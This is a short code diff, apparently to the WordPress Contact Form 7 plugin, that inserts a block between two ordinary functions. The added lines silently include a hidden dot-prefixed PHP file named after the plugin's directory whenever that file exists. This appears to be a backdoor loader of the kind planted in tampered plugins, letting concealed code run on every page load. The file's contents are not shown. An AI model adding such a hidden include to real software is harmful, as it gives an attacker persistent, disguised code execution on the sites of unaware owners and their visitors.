@@ -30,6 +30,10 @@ function wpcf7_scan_shortcode( $cond = null ) {
 	return wpcf7_scan_form_tags( $cond );
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPCF7_ShortcodeManager {
 
 	private static $form_tags_manager;
